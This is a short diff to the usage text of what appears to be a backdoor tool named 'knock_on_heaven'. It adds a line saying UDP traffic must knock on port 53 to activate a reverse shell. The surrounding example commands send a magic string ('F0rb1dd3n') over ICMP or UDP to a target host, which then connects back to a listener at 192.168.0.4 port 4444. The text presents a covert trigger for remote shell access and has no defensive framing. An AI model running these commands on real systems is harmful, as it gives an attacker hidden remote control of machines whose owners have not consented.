@@ -69,6 +69,7 @@ Usage: ./knock_on_heaven <args>
 -l      Launch listener
 
 [!] ICMP doesn't need ports
+[!] UDP needs to knock on port 53 to activate the reverse shell
 
 ICMP: ./knock_on_heaven -x icmp -s 192.168.0.2 -t 192.168.0.3 -d "F0rb1dd3n 192.168.0.4 4444" -l
 UDP:  ./knock_on_heaven -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 53 -q 53 -d "F0rb1dd3n 192.168.0.4 4444" -l
